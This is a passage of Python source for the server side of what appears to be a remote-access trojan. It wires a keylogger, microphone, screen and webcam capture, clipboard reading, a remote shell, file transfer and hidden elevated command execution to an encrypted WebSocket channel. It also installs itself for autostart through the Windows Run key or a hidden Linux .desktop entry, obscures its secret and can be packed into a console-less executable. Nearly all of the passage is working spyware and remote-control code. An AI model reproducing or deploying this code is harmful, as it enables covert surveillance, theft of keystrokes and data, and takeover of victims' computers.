    try:
        kwargs = {"button": button, "clicks": clicks}
        if x is not None and y is not None:
            pyautogui.click(x, y, **kwargs)
        else:
            pyautogui.click(**kwargs)
        return True, f"Clicked {button} x{clicks}"
    except Exception as e:
        return False, str(e)


def mouse_scroll(dx=0, dy=0):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
    try:
        if dy:
            pyautogui.scroll(dy)
        if dx:
            pyautogui.hscroll(dx)
        return True, f"Scrolled dx={dx} dy={dy}"
    except Exception as e:
        return False, str(e)


def keyboard_type(text):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
    try:
        pyautogui.typewrite(text, interval=0.02)
        return True, f"Typed {len(text)} chars"
    except Exception as e:
        return False, str(e)


def keyboard_hotkey(*keys):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
    try:
        pyautogui.hotkey(*keys)
        return True, f"Hotkey: {'+'.join(keys)}"
    except Exception as e:
        return False, str(e)


def keyboard_press(key):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
    try:
        pyautogui.press(key)
        return True, f"Pressed {key}"
    except Exception as e:
        return False, str(e)


# ===================================================================
# Auto-update functionality
# ===================================================================
GITHUB_REPO = "Pryanik-M/GoodScript"
UPDATE_DIR = os.path.join(SERVER_DIR, ".update_temp")

async def get_latest_release_url():
    """Get the latest release or archive URL from GitHub."""
    try:
        # Try to get latest release first
        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
        req = urllib.request.Request(api_url, headers={"Accept": "application/vnd.github.v3+json"})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            if "assets" in data and data["assets"]:
                # Return first asset (usually the main archive)
                return data["assets"][0]["browser_download_url"], data.get("tag_name", "unknown")
    except (urllib.error.URLError, urllib.error.HTTPError, Exception) as e:
        log.debug("Failed to get release: %s, trying archive fallback", e)
    
    # Fallback: get latest commit archive
    try:
        archive_url = f"https://github.com/{GITHUB_REPO}/archive/refs/heads/main.zip"
        req = urllib.request.Request(archive_url)
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                return archive_url, "main"
    except Exception as e:
        log.error("Failed to get archive: %s", e)
    
    return None, None


async def download_update(url):
    """Download update archive from URL."""
    try:
        os.makedirs(UPDATE_DIR, exist_ok=True)
        archive_path = os.path.join(UPDATE_DIR, "update.zip")
        
        log.info("Downloading update from: %s", url)
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=60) as response:
            with open(archive_path, "wb") as f:
                chunk_size = 8192
                while True:
                    chunk = response.read(chunk_size)
                    if not chunk:
                        break
                    f.write(chunk)
        
        log.info("Update downloaded: %s", archive_path)
        return archive_path
    except Exception as e:
        log.error("Download failed: %s", e)
        return None


async def extract_update(archive_path):
    """Extract update archive."""
    try:
        extract_dir = os.path.join(UPDATE_DIR, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        log.info("Extracting update archive...")
        with zipfile.ZipFile(archive_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find the main directory (usually GoodScript-main or similar)
        entries = os.listdir(extract_dir)
        if entries:
            main_dir = os.path.join(extract_dir, entries[0])
            if os.path.isdir(main_dir):
                return main_dir
        
        return extract_dir
    except Exception as e:
        log.error("Extraction failed: %s", e)
        return None


async def apply_update(source_dir):
    """Copy updated files to server directory."""
    try:
        log.info("Applying update from: %s", source_dir)
        
        # Backup current files
        backup_dir = os.path.join(UPDATE_DIR, "backup")
        os.makedirs(backup_dir, exist_ok=True)
        
        # Copy important files from source to SERVER_DIR
        important_files = ["server.py", "client.py", "shared.py", "gui_client.py"]
        
        for fname in important_files:
            src = os.path.join(source_dir, fname)
            if os.path.isfile(src):
                dst = os.path.join(SERVER_DIR, fname)
                backup = os.path.join(backup_dir, fname)
                
                # Backup current version
                if os.path.isfile(dst):
                    shutil.copy2(dst, backup)
                
                # Copy new version
                shutil.copy2(src, dst)
                log.info("Updated: %s", fname)
        
        log.info("Update applied successfully")
        return True
    except Exception as e:
        log.error("Apply update failed: %s", e)
        return False


async def do_update(ws, fernet):
    """Full update procedure."""
    try:
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "starting", "message": "Проверка обновлений..."},
        })
        
        # Get latest release URL
        url, version = await get_latest_release_url()
        if not url:
            await _safe_send(ws, fernet, {
                "type": "update_status",
                "payload": {"status": "error", "message": "Не удалось получить ссылку на обновление"},
            })
            return
        
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "downloading", "message": f"Загрузка {version}..."},
        })
        
        # Download update
        archive_path = await download_update(url)
        if not archive_path:
            await _safe_send(ws, fernet, {
                "type": "update_status",
                "payload": {"status": "error", "message": "Ошибка загрузки"},
            })
            return
        
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "extracting", "message": "Распаковка архива..."},
        })
        
        # Extract update
        source_dir = await extract_update(archive_path)
        if not source_dir:
            await _safe_send(ws, fernet, {
                "type": "update_status",
                "payload": {"status": "error", "message": "Ошибка распаковки"},
            })
            return
        
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "installing", "message": "Установка обновления..."},
        })
        
        # Apply update
        success = await apply_update(source_dir)
        if not success:
            await _safe_send(ws, fernet, {
                "type": "update_status",
                "payload": {"status": "error", "message": "Ошибка установки"},
            })
            return
        
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "restarting", "message": "Перезапуск сервера..."},
        })
        
        await asyncio.sleep(1)
        
        # Cleanup
        try:
            shutil.rmtree(UPDATE_DIR, ignore_errors=True)
        except Exception:
            pass
        
        # Restart server
        log.info("Update complete, restarting...")
        _restart_self()
        
    except Exception as e:
        log.error("Update failed: %s", e)
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "error", "message": str(e)},
        })


RESTART_EXIT_CODE = 42


def _restart_self():
    """Cross-platform server restart after update."""
    python_exe = sys.executable
    server_py = os.path.abspath(__file__)
    
    # Build the same command line, but remove --hidden to allow console on restart
    argv = sys.argv[:]
    
    if IS_WINDOWS:
        try:
            bat = os.path.join(tempfile.gettempdir(), "_remote_restart.bat")
            with open(bat, "w") as f:
                f.write('@echo off\n')
                f.write('ping -n 3 127.0.0.1 >nul\n')
                f.write(f'"{python_exe}" {" ".join(argv)}\n')
                f.write('del /f /q "%~f0"\n')
            DETACHED_PROCESS = 0x00000008
            subprocess.Popen(
                f'cmd /c "{bat}"',
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                close_fds=True,
            )
        except Exception as e:
            log.error("Windows restart script failed: %s", e)
    else:
        try:
            sh = os.path.join(tempfile.gettempdir(), "_remote_restart.sh")
            with open(sh, "w") as f:
                f.write('#!/bin/sh\n')
                f.write('sleep 3\n')
                f.write(f'exec "{python_exe}" {" ".join(argv)}\n')
                f.write('rm -f "$0"\n')
            os.chmod(sh, 0o755)
            subprocess.Popen(
                [sh],
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
        except Exception as e:
            log.error("Linux restart script failed: %s", e)
    
    os._exit(RESTART_EXIT_CODE)


async def do_uninstall(ws, fernet):
    remove_autostart()
    keylogger.stop()

    if os.path.isfile(LOG_FILE_PATH):
        try:
            os.remove(LOG_FILE_PATH)
        except Exception:
            pass

    await _safe_send(ws, fernet, {
        "type": "uninstall_result",
        "payload": {"success": True, "message": "Uninstall complete, server will exit"},
    })

    await asyncio.sleep(1)

    server_file = os.path.abspath(__file__)
    shared_file = os.path.join(SERVER_DIR, "shared.py")
    try:
        if IS_WINDOWS:
            bat = os.path.join(tempfile.gettempdir(), "_remote_uninstall.bat")
            with open(bat, "w") as f:
                f.write(f'@echo off\nping -n 3 127.0.0.1 >nul\n'
                        f'del /f /q "{server_file}"\n'
                        f'del /f /q "{shared_file}"\n'
                        f'del /f /q "{LOG_FILE_PATH}"\n'
                        f'del /f /q "%~f0"\n')
            DETACHED_PROCESS = 0x00000008
            subprocess.Popen(
                f'cmd /c "{bat}"',
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                close_fds=True,
            )
        else:
            sh = os.path.join(tempfile.gettempdir(), "_remote_uninstall.sh")
            with open(sh, "w") as f:
                f.write(f'#!/bin/sh\nsleep 3\n'
                        f'rm -f "{server_file}"\n'
                        f'rm -f "{shared_file}"\n'
                        f'rm -f "{LOG_FILE_PATH}"\n'
                        f'rm -f "$0"\n')
            os.chmod(sh, 0o755)
            subprocess.Popen(
                [sh],
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
    except Exception as e:
        log.error("Uninstall cleanup failed: %s", e)

    sys.exit(0)


# ===================================================================
# WebSocket handler
# ===================================================================
keylogger = Keylogger()

async def client_handler(ws):
    global SHARED_SECRET
    fernet = make_fernet(SHARED_SECRET)
    camera = None
    screen_stream = None
    shell_session = None
    file_tracker = FileTransferTracker()

    # Auth with proper error handling
    try:
        raw = await asyncio.wait_for(ws.recv(), timeout=15)
    except asyncio.TimeoutError:
        log.warning("Auth timeout: client did not send auth message within 15s")
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "timeout"}}))
        except Exception:
            pass
        return
    except Exception as e:
        log.warning("Auth recv error: %s", e)
        return

    try:
        auth_msg = decrypt_msg(fernet, raw)
    except Exception as e:
        log.warning("Auth decryption failed: %s (possible key mismatch)", e)
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "decryption_error"}}))
        except Exception:
            pass
        return

    if auth_msg.get("type") != "auth" or auth_msg.get("payload", {}).get("token") != SHARED_SECRET:
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "invalid_token"}}))
        except Exception:
            pass
        log.warning("Wrong token from client")
        return

    await ws.send(encrypt_msg(fernet, {"type": "auth_ok", "payload": {}}))
    log.info("Client authenticated")

    try:
        async for raw in ws:
            try:
                msg = decrypt_msg(fernet, raw)
            except Exception as e:
                log.debug("Message decrypt failed: %s", e)
                continue

            t = msg.get("type")

            if t == "keylog_start":
                keylogger.start()
                await ws.send(encrypt_msg(fernet, {"type": "keylog_status", "payload": {"status": "started"}}))
            elif t == "keylog_stop":
                keylogger.stop()
                await ws.send(encrypt_msg(fernet, {"type": "keylog_status", "payload": {"status": "stopped"}}))
            elif t == "keylog_get":
                text = keylogger.get_log()
                await ws.send(encrypt_msg(fernet, {
                    "type": "keylog_data",
                    "payload": {"data": text, "length": len(text)},
                }))

            elif t == "audio_start":
                p = msg["payload"]
                dur = p.get("duration") if p else None
                ok, msg_text = recorder.start(duration=dur)
                await ws.send(encrypt_msg(fernet, {
                    "type": "audio_status",
                    "payload": {"status": "started" if ok else "failed", "message": msg_text},
                }))
            elif t == "audio_stop":
                ok, msg_text = recorder.stop()
                await ws.send(encrypt_msg(fernet, {
                    "type": "audio_status",
                    "payload": {"status": "stopped" if ok else "failed", "message": msg_text},
                }))
            elif t == "audio_list":
                recs = recorder.list_recordings()
                await ws.send(encrypt_msg(fernet, {"type": "audio_list", "payload": {"recordings": recs}}))
            elif t == "audio_download":
                name = msg["payload"]["name"]
                data = recorder.get_recording(name)
                if data:
                    b64 = base64.b64encode(data).decode()
                    total = max(1, -(-len(b64) // CHUNK_SIZE))
                    for i in range(total):
                        s = i * CHUNK_SIZE
                        e = s + CHUNK_SIZE
                        await ws.send(encrypt_msg(fernet, {
                            "type": "audio_data",
                            "payload": {
                                "data_b64": b64[s:e],
                                "chunk_index": i,
                                "total_chunks": total,
                                "filename": name,
                            },
                        }))
                    log.info("Audio sent: %s (%d chunks)", name, total)
                else:
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": f"Not found: {name}"}}))
            elif t == "audio_delete":
                name = msg["payload"].get("name")
                if name:
                    recorder.delete_recording(name)
                else:
                    recorder.delete_all()
                await ws.send(encrypt_msg(fernet, {"type": "audio_status", "payload": {"status": "deleted"}}))

            elif t == "screen_rec_start":
                p = msg["payload"]
                ok, msg_text = screen_recorder.start(
                    fps=p.get("fps", 10), duration=p.get("duration"))
                await ws.send(encrypt_msg(fernet, {
                    "type": "screen_rec_status",
                    "payload": {"status": "started" if ok else "failed", "message": msg_text},
                }))
            elif t == "screen_rec_stop":
                ok, msg_text = screen_recorder.stop()
                await ws.send(encrypt_msg(fernet, {
                    "type": "screen_rec_status",
                    "payload": {"status": "stopped", "message": msg_text},
                }))
            elif t == "screen_rec_list":
                recs = screen_recorder.list_recordings()
                await ws.send(encrypt_msg(fernet, {"type": "screen_rec_list", "payload": {"recordings": recs}}))
            elif t == "screen_rec_download":
                name = msg["payload"]["name"]
                data = screen_recorder.get_recording(name)
                if data:
                    b64 = base64.b64encode(data).decode()
                    total = max(1, -(-len(b64) // CHUNK_SIZE))
                    for i in range(total):
                        s = i * CHUNK_SIZE
                        e = s + CHUNK_SIZE
                        await ws.send(encrypt_msg(fernet, {
                            "type": "file_data",
                            "payload": {
                                "data_b64": b64[s:e],
                                "chunk_index": i,
                                "total_chunks": total,
                                "filename": name,
                            },
                        }))
                else:
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": f"Not found: {name}"}}))
            elif t == "screen_rec_delete":
                name = msg["payload"].get("name")
                if name:
                    screen_recorder.delete_recording(name)
                await ws.send(encrypt_msg(fernet, {"type": "screen_rec_status", "payload": {"status": "deleted"}}))

            elif t == "ping":
                await ws.send(encrypt_msg(fernet, {"type": "pong", "payload": {}}))

            elif t == "heartbeat":
                info = get_sysinfo()
                await ws.send(encrypt_msg(fernet, {"type": "heartbeat", "payload": info}))

            elif t == "process_list":
                procs = get_process_list()
                await ws.send(encrypt_msg(fernet, {"type": "process_list", "payload": {"processes": procs}}))

            elif t == "process_kill":
                p = msg["payload"]
                ok, msg_text = kill_process(pid=p.get("pid"), name=p.get("name"))
                await ws.send(encrypt_msg(fernet, {
                    "type": "process_kill_result",
                    "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "sysinfo":
                info = get_sysinfo()
                await ws.send(encrypt_msg(fernet, {"type": "sysinfo", "payload": info}))

            elif t == "fs_list":
                path = msg["payload"].get("path", ".")
                result = fs_list(path)
                await ws.send(encrypt_msg(fernet, {"type": "fs_list", "payload": result}))

            elif t == "clipboard_get":
                ok, text = get_clipboard()
                await ws.send(encrypt_msg(fernet, {
                    "type": "clipboard_result",
                    "payload": {"success": ok, "text": text},
                }))

            elif t == "clipboard_set":
                text = msg["payload"].get("text", "")
                ok, msg_text = set_clipboard(text)
                await ws.send(encrypt_msg(fernet, {
                    "type": "clipboard_result",
                    "payload": {"success": ok, "text": msg_text},
                }))

            elif t == "update":
                # Start update in background task to not block handler
                asyncio.create_task(do_update(ws, fernet))

            elif t == "uninstall":
                await do_uninstall(ws, fernet)

            elif t == "mouse_move":
                p = msg["payload"]
                ok, msg_text = mouse_move(p.get("x", 0), p.get("y", 0), p.get("relative", False))
                await ws.send(encrypt_msg(fernet, {
                    "type": "mouse_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "mouse_click":
                p = msg["payload"]
                ok, msg_text = mouse_click(
                    p.get("x"), p.get("y"),
                    p.get("button", "left"), p.get("clicks", 1),
                )
                await ws.send(encrypt_msg(fernet, {
                    "type": "mouse_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "mouse_scroll":
                p = msg["payload"]
                ok, msg_text = mouse_scroll(p.get("dx", 0), p.get("dy", 0))
                await ws.send(encrypt_msg(fernet, {
                    "type": "mouse_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "keyboard_type":
                p = msg["payload"]
                ok, msg_text = keyboard_type(p.get("text", ""))
                await ws.send(encrypt_msg(fernet, {
                    "type": "keyboard_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "keyboard_hotkey":
                p = msg["payload"]
                keys = p.get("keys", [])
                ok, msg_text = keyboard_hotkey(*keys) if keys else (False, "No keys")
                await ws.send(encrypt_msg(fernet, {
                    "type": "keyboard_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "keyboard_press":
                p = msg["payload"]
                ok, msg_text = keyboard_press(p.get("key", ""))
                await ws.send(encrypt_msg(fernet, {
                    "type": "keyboard_result", "payload": {"success": ok, "message": msg_text},
                }))

            elif t == "exec_elevated":
                p = msg["payload"]
                command = p.get("command", "")
                try:
                    if IS_WINDOWS:
                        DETACHED_PROCESS = 0x00000008
                        full_cmd = f'powershell -Command "Start-Process cmd -ArgumentList \'/c {command}\' -Verb RunAs -WindowStyle Hidden"'
                        proc = subprocess.Popen(
                            full_cmd,
                            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            creationflags=DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                            close_fds=True,
                        )
                        await ws.send(encrypt_msg(fernet, {
                            "type": "exec_result",
                            "payload": {"stdout": f"Elevated command launched (PID {proc.pid})", "stderr": "", "returncode": 0},
                        }))
                    else:
                        full_cmd = f'pkexec bash -c "{command}"'
                        proc = subprocess.Popen(
                            full_cmd,
                            shell=True,
                            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True,
                            close_fds=True,
                        )
                        await ws.send(encrypt_msg(fernet, {
                            "type": "exec_result",
                            "payload": {"stdout": f"Elevated command launched (PID {proc.pid})", "stderr": "", "returncode": 0},
                        }))
                except Exception as e:
                    await ws.send(encrypt_msg(fernet, {
                        "type": "exec_result",
                        "payload": {"stdout": "", "stderr": str(e), "returncode": -1},
                    }))

            elif t == "screenshot":
                quality = msg["payload"].get("quality", 80)
                data, err = capture_screenshot(quality)
                if data:
                    await ws.send(encrypt_msg(fernet, {"type": "screenshot_data", "payload": data}))
                else:
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": err}}))

            # Screen stream (live)
            elif t == "screen_start":
                if screen_stream:
                    await screen_stream.stop()
                p = msg["payload"]
                screen_stream = ScreenStream(ws, fernet, fps=p.get("fps", 5), quality=p.get("quality", 70))
                await screen_stream.start()
            elif t == "screen_stop":
                if screen_stream:
                    await screen_stream.stop()
                    screen_stream = None

            # Camera
            elif t == "stream_start":
                if camera and camera.task:
                    await camera.stop()
                p = msg["payload"]
                camera = CameraStream(ws, fernet, p.get("camera_index", 0), p.get("fps", 10), p.get("quality", 80))
                await camera.start()
            elif t == "stream_stop":
                if camera:
                    await camera.stop()
                    camera = None

            elif t == "exec":
                p = msg["payload"]
                sudo_password = p.get("sudo_password")
                result = await run_command(p["command"], p.get("timeout", 60), sudo_password=sudo_password)
                await ws.send(encrypt_msg(fernet, {"type": "exec_result", "payload": result}))

            elif t == "shell_open":
                if shell_session:
                    await shell_session.close()
                shell_session = ShellSession(ws, fernet)
                await shell_session.open()
            elif t == "shell_input":
                if shell_session:
                    await shell_session.write(msg["payload"]["data"])
            elif t == "shell_close":
                if shell_session:
                    await shell_session.close()
                    shell_session = None

            elif t == "file_send":
                p = msg["payload"]
                clean_path = file_tracker.resolve_path(p["path"])
                raw_bytes = file_tracker.accumulate(clean_path, p["data_b64"], p["chunk_index"], p["total_chunks"])
                if raw_bytes is not None:
                    with open(clean_path, "wb") as f:
                        f.write(raw_bytes)
                    log.info("File received: %s (%d bytes)", clean_path, len(raw_bytes))
                    await ws.send(encrypt_msg(fernet, {"type": "file_ack", "payload": {"path": os.path.basename(clean_path)}}))

            elif t == "file_recv":
                path = msg["payload"]["path"]
                if not os.path.isabs(path):
                    path = os.path.join(SERVER_DIR, path)
                if not os.path.isfile(path):
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": f"File not found: {path}"}}))
                    continue
                with open(path, "rb") as f:
                    raw = f.read()
                b64 = base64.b64encode(raw).decode()
                total = max(1, -(-len(b64) // CHUNK_SIZE))
                fname = os.path.basename(path)
                for i in range(total):
                    await ws.send(encrypt_msg(fernet, {
                        "type": "file_data",
                        "payload": {
                            "data_b64": b64[i * CHUNK_SIZE:(i + 1) * CHUNK_SIZE],
                            "chunk_index": i,
                            "total_chunks": total,
                            "filename": fname,
                        },
                    }))
                log.info("File sent: %s (%d chunks)", path, total)

            # Log management
            elif t == "log_view":
                await handle_log_view(ws, fernet)
            elif t == "log_download":
                await handle_log_download(ws, fernet)
            elif t == "log_delete":
                await handle_log_delete(ws, fernet)

            elif t == "install_autostart":
                secret = msg["payload"].get("secret", SHARED_SECRET)
                ok = install_autostart(secret=secret)
                await ws.send(encrypt_msg(fernet, {
                    "type": "autostart_result",
                    "payload": {"success": ok, "message": "Installed" if ok else "Failed"},
                }))

            elif t == "remove_autostart":
                ok = remove_autostart()
                await ws.send(encrypt_msg(fernet, {
                    "type": "autostart_result",
                    "payload": {"success": ok, "message": "Removed" if ok else "Failed"},
                }))

            elif t == "server_restart":
                await ws.send(encrypt_msg(fernet, {
                    "type": "server_restart_ack",
                    "payload": {"status": "restarting"},
                }))
                log.info("Server restart requested via API")
                await restart_server()

            elif t == "update_apply":
                filename = os.path.basename(msg["payload"]["path"])
                zip_path = os.path.join(SERVER_DIR, filename)
                update_dir = os.path.join(SERVER_DIR, "_update")
                log.info("Applying update from: %s", zip_path)

                import zipfile as _zf
                if os.path.exists(zip_path):
                    try:
                        with _zf.ZipFile(zip_path, 'r') as zf:
                            os.makedirs(update_dir, exist_ok=True)
                            zf.extractall(update_dir)
                        log.info("Update extracted via zipfile")
                    except Exception as e:
                        if IS_WINDOWS:
                            result = await run_command(
                                f'powershell -Command "Expand-Archive -Path \'{zip_path}\' -DestinationPath \'{update_dir}\' -Force"',
                            )
                            if result["returncode"] != 0:
                                log.error("PowerShell extract failed: %s", result.get("stderr", ""))
                        else:
                            log.error("Extract failed: %s", e)
                else:
                    await ws.send(encrypt_msg(fernet, {
                        "type": "update_complete",
                        "payload": {"status": "failed: zip not found"},
                    }))
                    continue

                if os.path.exists(update_dir):
                    if camera: await camera.stop()
                    if shell_session: await shell_session.close()
                    if screen_stream: await screen_stream.stop()
                    keylogger.stop()

                    # Rename current server.py before overwriting
                    this_file = os.path.abspath(__file__)
                    for f_name in os.listdir(update_dir):
                        src = os.path.join(update_dir, f_name)
                        if not os.path.isfile(src):
                            continue
                        dst = os.path.join(SERVER_DIR, f_name)
                        if os.path.abspath(src) == this_file:
                            shutil.copy2(src, dst + ".new")
                        else:
                            try:
                                shutil.copy2(src, dst)
                            except Exception as e:
                                log.warning("Update skip %s: %s", f_name, e)

                    shutil.rmtree(update_dir, ignore_errors=True)
                    try:
                        os.remove(zip_path)
                    except Exception:
                        pass

                    await ws.send(encrypt_msg(fernet, {
                        "type": "update_complete",
                        "payload": {"status": "restarting"},
                    }))
                    log.info("Restarting server...")
                    await restart_server()
                else:
                    await ws.send(encrypt_msg(fernet, {
                        "type": "update_complete",
                        "payload": {"status": "failed: update directory not created after extraction"},
                    }))

    except websockets.exceptions.ConnectionClosed as e:
        log.info("Client disconnected (code=%s, reason=%s)", e.code, e.reason)
    except asyncio.CancelledError:
        log.info("Connection cancelled")
    except Exception as e:
        log.exception("Handler error: %s", e)
    finally:
        if camera:
            await camera.stop()
        if screen_stream:
            await screen_stream.stop()
        if shell_session:
            await shell_session.close()
        keylogger.stop()


# ===================================================================
# Server restart helper
# ===================================================================
async def restart_server():
    this_file = os.path.abspath(__file__)
    watchdog_flag = "--watchdog" if "--watchdog" in sys.argv else ""
    try:
        cmd = [sys.executable, this_file, "--secret", SHARED_SECRET, "--hidden"]
        if watchdog_flag:
            cmd.append(watchdog_flag)
        if IS_WINDOWS:
            DETACHED_PROCESS = 0x00000008
            child = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS,
            )
        else:
            child = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                start_new_session=True,
            )
        log.info("Restarted server as PID %d", child.pid)
    except Exception as e:
        log.error("Restart failed: %s", e)
    await asyncio.sleep(2)
    os._exit(0)


# ===================================================================
# Post-restart: apply .new files
# ===================================================================
def apply_pending_updates():
    for f in os.listdir(SERVER_DIR):
        if f.endswith(".new"):
            src = os.path.join(SERVER_DIR, f)
            dst = src[:-4]
            try:
                shutil.copy2(src, dst)
                os.remove(src)
                log.info("Applied pending update: %s", f)
            except Exception as e:
                log.warning("Failed pending update %s: %s", f, e)


# ===================================================================
# File logging
# ===================================================================
def setup_file_logging():
    log_path = os.path.join(SERVER_DIR, "server.log")
    fh = logging.FileHandler(log_path, encoding="utf-8")
    fh.setLevel(logging.INFO)
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logging.getLogger().addHandler(fh)
    return log_path


# ===================================================================
# Auto-install via registry (no VBS, no temp files)
# ===================================================================
def _obfuscate_secret(secret: str) -> str:
    encoded = base64.b64encode(secret.encode()).decode()
    reversed_enc = encoded[::-1]
    return f"OBF:{reversed_enc}"


def _deobfuscate_secret(obf: str) -> str:
    if obf.startswith("OBF:"):
        reversed_enc = obf[4:]
        encoded = reversed_enc[::-1]
        return base64.b64decode(encoded).decode()
    return obf


def install_autostart(secret=None):
    """Install autostart. Windows: HKCU registry. Linux: ~/.config/autostart/ .desktop"""
    python_exe = sys.executable
    server_py = os.path.abspath(__file__)

    if not secret:
        secret = SHARED_SECRET
        if not secret:
            log.error("No secret provided for autostart")
            return False

    obf_secret = _obfuscate_secret(secret)

    if IS_WINDOWS:
        startup_dir = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        for vbs_name in ("RemoteService.vbs", "RemoteService.wsh"):
            vbs_path = os.path.join(startup_dir, vbs_name)
            if os.path.exists(vbs_path):
                try:
                    os.remove(vbs_path)
                    log.info("Removed old VBS autostart: %s", vbs_path)
                except Exception as e:
                    log.warning("Failed to remove old VBS file %s: %s", vbs_path, e)

        cmd = f'"{python_exe}" "{server_py}" --secret "{obf_secret}" --hidden --watchdog'

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE) as k:
                try:
                    winreg.DeleteValue(k, "RemoteService")
                    log.info("Removed old RemoteService entry")
                except FileNotFoundError:
                    pass
                winreg.SetValueEx(k, "RemoteService", 0, winreg.REG_SZ, cmd)
            log.info("Autostart installed via registry: %s", cmd)
            print("Autostart installed in HKCU registry")
            return True
        except Exception as e:
            log.error(f"Registry autostart failed: {e}")
            print(f"Autostart failed: {e}")
            return False
    else:
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_path = os.path.join(autostart_dir, "remoteservice.desktop")
        server_dir = os.path.dirname(os.path.abspath(__file__))
        python_exe = sys.executable
        if not os.path.isabs(python_exe):
            python_exe = os.path.join(server_dir, python_exe)
        desktop_content = (
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Name=RemoteService\n"
            f'Exec={python_exe} {server_dir}/server.py --secret "{obf_secret}" --hidden --watchdog\n'
            f'Path={server_dir}\n'
            "Hidden=false\n"
            "NoDisplay=true\n"
            "X-GNOME-Autostart-enabled=true\n"
            "X-GNOME-Autostart-Delay=5\n"
        )
        try:
            with open(desktop_path, "w") as f:
                f.write(desktop_content)
            os.chmod(desktop_path, 0o755)
            log.info("Autostart installed via .desktop: %s", desktop_path)
            print(f"Autostart installed: {desktop_path}")
            return True
        except Exception as e:
            log.error(f"Linux autostart failed: {e}")
            print(f"Autostart failed: {e}")
            return False


def remove_autostart():
    """Remove autostart entry. Windows: HKCU registry. Linux: ~/.config/autostart/"""
    success = True
    if IS_WINDOWS:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, "RemoteService")
            log.info("Removed RemoteService from registry")
        except FileNotFoundError:
            pass
        except Exception as e:
            log.error(f"Failed to remove registry entry: {e}")
            success = False

        startup_dir = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        for vbs_name in ("RemoteService.vbs", "RemoteService.wsh"):
            vbs_path = os.path.join(startup_dir, vbs_name)
            if os.path.exists(vbs_path):
                try:
                    os.remove(vbs_path)
                    log.info("Removed VBS file: %s", vbs_path)
                except Exception as e:
                    log.warning(f"Failed to remove {vbs_path}: {e}")
    else:
        desktop_path = os.path.expanduser("~/.config/autostart/remoteservice.desktop")
        if os.path.exists(desktop_path):
            try:
                os.remove(desktop_path)
                log.info("Removed .desktop autostart: %s", desktop_path)
            except Exception as e:
                log.error(f"Failed to remove .desktop: {e}")
                success = False
    return success


# ===================================================================
# Build EXE
# ===================================================================
def build_exe():
    if not shutil.which("pyinstaller"):
        log.error("Install: pip install pyinstaller")
        sys.exit(1)
    script = Path(__file__).resolve()
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--name", "remote_server",
        "--hidden-import=mss", "--hidden-import=cv2",
        "--hidden-import=PIL", "--hidden-import=cryptography",
        "--hidden-import=websockets", "--hidden-import=keyboard",
